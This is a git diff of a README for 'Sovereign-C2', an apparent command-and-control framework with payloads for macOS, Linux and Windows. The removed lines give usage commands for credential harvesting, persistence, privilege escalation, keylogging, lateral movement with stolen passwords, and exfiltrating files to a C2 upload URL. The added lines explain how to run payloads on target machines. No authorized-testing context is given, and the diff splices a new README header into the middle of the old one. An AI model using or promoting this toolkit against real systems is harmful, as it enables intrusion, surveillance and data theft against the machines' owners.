@@ -10,150 +10,88 @@ This framework provides advanced post-exploitation capabilities with a focus on 
 - **Modular Design**: Easily add new modules and functionalities.
 - **Logging and Reporting**: Detailed logging and report generation.
 
-## Usage
+# Sovereign-C2
 
-### Setting Up the C2 Server
+## Overview
+Sovereign-C2 is a command and control (C2) server for managing agents across different platforms. This repository includes payloads for macOS, Linux, and Windows, allowing for remote command execution and data collection.
 
-1. **Create a Python virtual environment and activate it**:
-    ```bash
-    python -m venv venv
-    source venv/bin/activate  # On Windows: venv\Scripts\activate
-    ```
+## Features
+- Multi-platform support (macOS, Linux, Windows)
+- Remote command execution
+- Data collection and reporting
+- Persistence mechanisms
+- Encryption for secure communication
 
-2. **Install the required dependencies**:
-    ```bash
-    pip install -r c2_server/requirements.txt
-    ```
+## Prerequisites
+- Python 3.x
+- Virtualenv (recommended)
 
-3. **Run the C2 server**:
-    ```bash
-    python c2_server/c2_server.py
-    ```
+## Setup
 
-### Using the CLI
+1. **Clone the Repository**
+   git clone https://github.com/yourusername/Sovereign-C2.git
+   cd Sovereign-C2
 
-The CLI provides various commands to interact with the framework.
+2. **Create and Activate Virtual Environment**
+   python -m venv venv
+   source venv/bin/activate  # On Windows, use `venv\Scripts\activate`
 
-#### List all registered agents:
-```bash
-python cli/cli.py list_agents
-```
+3. **Install Dependencies**
+   pip install -r requirements.txt
 
-#### Send a command to a specific agent:
-```bash
-python cli/cli.py send_command --agent_id AGENT_ID --command "Your command here"
-```
+## Running the Server
 
-#### Generate an obfuscated payload for a specific platform:
-```bash
-python cli/cli.py generate_payload --platform PLATFORM
-```
+1. **Start the Server**
+   python server.py
 
-#### Harvest credentials:
-```bash
-python cli/cli.py harvest_credentials
-```
+## Deploying Payloads
 
-#### Establish persistence:
-```bash
-python cli/cli.py establish_persistence
-```
+### macOS
 
-#### Escalate privileges:
-```bash
-python cli/cli.py escalate_privileges
-```
+1. **Ensure the script is executable**
+   chmod +x payloads/macos_payload.sh
 
-#### Gather system information:
-```bash
-python cli/cli.py gather_system_info
-```
+2. **Execute the script on the target macOS machine**
+   ./payloads/macos_payload.sh
 
-#### Exfiltrate data:
-```bash
-python cli/cli.py exfiltrate_data --file_path /path/to/file --c2_url https://your-c2-server.com/upload
-```
+### Linux
 
-#### Start keylogger:
-```bash
-python cli/cli.py start_keylogger --log_file_path /path/to/log_file
-```
+1. **Ensure the script is executable**
+   chmod +x payloads/linux_payload.sh
 
-#### Move laterally:
-```bash
-python cli/cli.py move_laterally --target_ip TARGET_IP --username USERNAME --password PASSWORD
-```
+2. **Execute the script on the target Linux machine**
+   ./payloads/linux_payload.sh
 
-### Example Commands
+### Windows
 
-1. **Listing all registered agents**:
-    ```bash
-    python cli/cli.py list_agents
-    ```
+1. **Run the script on the target Windows machine (with administrator privileges)**
+   .\payloads\windows_payload.ps1
 
-2. **Sending a command to a specific agent**:
-    ```bash
-    python cli/cli.py send_command --agent_id 1234-5678-9101-1121 --command "whoami"
-    ```
+## Using the CLI
 
-3. **Generating a payload for Windows**:
-    ```bash
-    python cli/cli.py generate_payload --platform windows
-    ```
+1. **List Agents**
+   python cli/cli.py list-agents
 
-4. **Harvesting credentials**:
-    ```bash
-    python cli/cli.py harvest_credentials
-    ```
+2. **Deploy Payload**
+   python cli/cli.py deploy-payload <agent_type>
+   # Example: python cli/cli.py deploy-payload windows
 
-5. **Establishing persistence**:
-    ```bash
-    python cli/cli.py establish_persistence
-    ```
+3. **Select and Send Command to Agent**
+   python cli/cli.py select-agent <AgentID>
 
-6. **Escalating privileges**:
-    ```bash
-    python cli/cli.py escalate_privileges
-    ```
+4. **Generate Report**
+   python cli/cli.py generate-report
 
-7. **Gathering system information**:
-    ```bash
-    python cli/cli.py gather_system_info
-    ```
+## Example Commands
 
-8. **Exfiltrating data**:
-    ```bash
-    python cli/cli.py exfiltrate_data --file_path /path/to/file --c2_url https://your-c2-server.com/upload
-    ```
+- `Get-ComputerInfo`
+- `Get-Process`
+- `Get-Service`
+- `Test-Connection www.example.com`
+- `Get-EventLog -LogName Application -Newest 10`
 
-9. **Starting a keylogger**:
-    ```bash
-    python cli/cli.py start_keylogger --log_file_path /path/to/log_file
-    ```
+## Contributing
+Contributions are welcome! Please submit a pull request or open an issue to discuss any changes or improvements.
 
-10. **Moving laterally**:
-    ```bash
-    python cli/cli.py move_laterally --target_ip TARGET_IP --username USERNAME --password PASSWORD
-    ```
-
-### Logging and Reporting
-
-Logs are stored in the `c2_server.log` file located in the `c2_server` directory. This file contains detailed information about agent activities and commands executed.
-
-To generate a report from the logged data, run the following command:
-```bash
-python c2_server/c2_server.py generate_report
-```
-This will create a `report.txt` file containing the logs. The report provides a comprehensive view of all interactions and events logged by the C2 server.
-
-### Adding New Modules
-
-To add new post-exploitation modules, create a new Python file in the `c2_server/modules` directory and implement the desired functionality. Update the CLI script to include commands for the new module.
-
-### Contribution
-
-Contributions to the Sovereign framework are welcome. Please submit a pull request with a detailed description of your changes.
-
-### License
-
-This project is licensed under the MIT License.
+## License
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
